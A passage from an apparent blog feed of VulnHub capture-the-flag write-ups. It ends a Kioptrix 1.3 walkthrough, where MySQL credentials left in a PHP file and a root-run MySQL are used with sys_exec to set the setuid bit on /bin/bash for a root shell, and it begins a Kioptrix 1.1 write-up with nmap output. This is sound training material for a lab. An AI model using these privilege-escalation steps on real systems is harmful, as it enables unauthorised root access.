&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pretty quiet, one thing that is to note is that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mysqld&lt;/code&gt; is running as root. Let’s see if there are any MySQL creds laying around we can take advantage of. We can start by looking around the default &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www&lt;/code&gt; web directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
/var/www
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 44
drwxr-xr-x  5 root root 4096 2012-02-06 11:44 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 14 root root 4096 2012-02-04 09:57 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 1477 2012-02-06 11:31 checklogin.php
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  298 2012-02-04 11:11 database.sql
drwxr-xr-x  2 root root 4096 2012-02-06 11:44 images
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root 1255 2012-02-06 12:07 index.php
drwxr-xr-x  2 root root 4096 2012-02-04 18:33 john
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  176 2012-02-04 12:39 login_success.php
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root   78 2012-02-04 11:33 logout.php
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  606 2012-02-06 15:42 member.php
drwxr-xr-x  2 root root 4096 2012-02-04 18:30 robert
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I won’t make you look in every file with me, eventually within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checklogin.php&lt;/code&gt; we find the following:&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Host name&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;root&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Mysql username&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Mysql password&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$db_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;members&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Database name&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$tbl_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;members&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Table name&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nice, a root login with a blank password. Now let’s try to use these creds:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'root'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
Enter password: 
Welcome to the MySQL monitor.  Commands end with &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; or &lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Your MySQL connection &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;is 41
Server version: 5.0.51a-3ubuntu5.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Type &lt;span class=&quot;s1&quot;&gt;'help;'&lt;/span&gt; or &lt;span class=&quot;s1&quot;&gt;'\h'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;help. Type &lt;span class=&quot;s1&quot;&gt;'\c'&lt;/span&gt; to clear the buffer.

mysql&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And we have a working MySQL session, note that within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enter password:&lt;/code&gt; line, I simply entered a blank password.&lt;/p&gt;

&lt;p&gt;Cool, so normally at this point you might want to look around the tables within the various databases, but since we know MySQL is running as root, there’s some fun exploitation we can do.&lt;/p&gt;

&lt;p&gt;There’s a great and quick &lt;a href=&quot;https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/&quot;&gt;blog post&lt;/a&gt; that walks through this exploitation.&lt;/p&gt;

&lt;p&gt;So, now knowing this (assuming you read the link), we can simply utilize &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_exec&lt;/code&gt; to do some fun stuff:&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Reading&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;completion&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;column&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;names&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;You&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;can&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;turn&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;off&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;feature&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;quicker&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;startup&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;Database&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'chmod u+s /bin/bash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ERROR&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1064&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;42000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;You&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;have&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;an&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SQL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syntax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;check&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;manual&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;that&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;corresponds&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MySQL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;right&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;syntax&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;near&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'mysql&amp;gt; select sys_exec('&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chmod&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;')'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;at&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;Database&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'chmod u+s /bin/bash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------------------------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'chmod u+s /bin/bash'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------------------------+&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NULL&lt;/span&gt;                            &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;---------------------------------+&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;row&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Bye&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;john&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;john&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;john&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;congrats&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Congratulations&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ve got root.

There is more then one way to get root on this system. Try and find them.
I'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ve&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;only&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tested&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;two&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;but&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;doesn&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'t mean there aren'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;more&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;always&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;there&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'s an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;easy&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;it&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;may&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;look&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;also&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;work&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;family&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;life&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;are&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;priorities&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Hobbies&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;are&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;low&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Really&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hope&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;enjoyed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;this&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;If&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;haven&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'t already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret

bash-3.2# 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And that’s root! If you’re confused what we just did, first consider this for chmod:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;“The operator + causes the selected file mode bits to be added to the existing file mode bits of each file”&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;So when we invoke &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod u+s /bin/bash&lt;/code&gt; We’re setting the user bit of us (root) to /bin/bash on execution.&lt;/p&gt;

&lt;p&gt;Next, we simply execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash -p&lt;/code&gt; and get an &lt;em&gt;effective user ID&lt;/em&gt; of 0 (root). Note that this works because of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; flag.. I skimmed through some documentation and this explanation of why this is neccessary is the best I could find:&lt;/p&gt;

&lt;p class=&quot;box-note&quot;&gt;If the shell is started with the effective user (group) id not equal to the real user (group) id, 
and the -p option is not supplied, no startup files are read, shell functions are not inherited from the environment, 
the SHELLOPTS, BASHOPTS, CDPATH, and GLOBIGNORE variables, if they appear in the environment, 
are ignored, and the effective user id is set to the real user id. If the -p option is supplied at invocation, 
the startup behavior is the same, but the effective user id is not reset.&lt;/p&gt;

&lt;p&gt;So yeah, basically if you don’t supply &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; the effective user ID portion won’t work.&lt;/p&gt;

&lt;p&gt;And that’s it! Rooted.&lt;/p&gt;</content><author><name>Ash</name></author><category term="VulnHub" /><category term="VulnHub" /><category term="ffuf" /><category term="enum4linux" /><category term="SQL Injection" /><category term="Restricted Shell Escapes" /><category term="setuid" /><summary type="html">Kioptrix Level 1.3 is the fourth iteration of the Kioptrix VulnHub challenges. It involves taking advantage of a SQL injection vulnerablility to login to a simple web application that leaks user credentials. Using these credentials we can connect to the box via SSH. Unfortunately, our SSH sessions spawn a restricted shell with very limited command availability. We use `echo` to spawn a full bash shell and escape these confines, from which we enumerate the box and find MySQL credentials. MySQL is running as root and we are able to use `sys_exec` to set the setuid bit on `/bin/bash`. From here we can simply execute the binary and receieve a root shell.</summary></entry><entry><title type="html">Kioptrix Level 1.1 (#2) Writeup - VulnHub</title><link href="http://localhost:4000/Kioptrix-Level-1.1/" rel="alternate" type="text/html" title="Kioptrix Level 1.1 (#2) Writeup - VulnHub" /><published>2020-07-28T00:00:00-04:00</published><updated>2020-07-28T00:00:00-04:00</updated><id>http://localhost:4000/Kioptrix-Level-1.1</id><content type="html" xml:base="http://localhost:4000/Kioptrix-Level-1.1/">&lt;p&gt;Kioptrix Level 1.1 is the next box in the series of Kioptrix VulnHub boxes. This box ups the ante from its predecessor, beginning with a simple SQL injection exploit to gain access to a web console. The web console can be bypassed to execute code, which we use to get a simple reverse shell. Finally, we successfully privilege escalate to root using a kernel exploit.&lt;/p&gt;

&lt;p&gt;Feel free to checkout my writeup on the first box: &lt;a href=&quot;https://0xash.io/Kioptrix-Level-1/&quot;&gt;Kioptrix 1&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The entire Kioptrix series is good baseline prep for anyone studying for their OSCP/PWK, learning Network pentesting, and trying to get some practice enumerating a box. I would highly recommend it &lt;em&gt;prior&lt;/em&gt; to purchasing PWK/OSCP as it will give you a good headstart and allow you to get the most out of your lab time.&lt;/p&gt;

&lt;p&gt;I’ll assume you’ve already got the box running and are able to reach it. Let’s get going.&lt;/p&gt;

&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;

&lt;p&gt;We’ll start by kicking off some NMAP scans.&lt;/p&gt;

&lt;h3 id=&quot;nmap-scans&quot;&gt;NMAP Scans&lt;/h3&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.0.35
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00015s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65528 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 1.99&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.0.52 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CentOS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn'&lt;/span&gt;t have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;UTF-8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;localhost.localdomain/organizationName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SomeOrganization/stateOrProvinceName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;SomeState/countryName&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2020-07-29T02:19:53+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +3h59m59s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
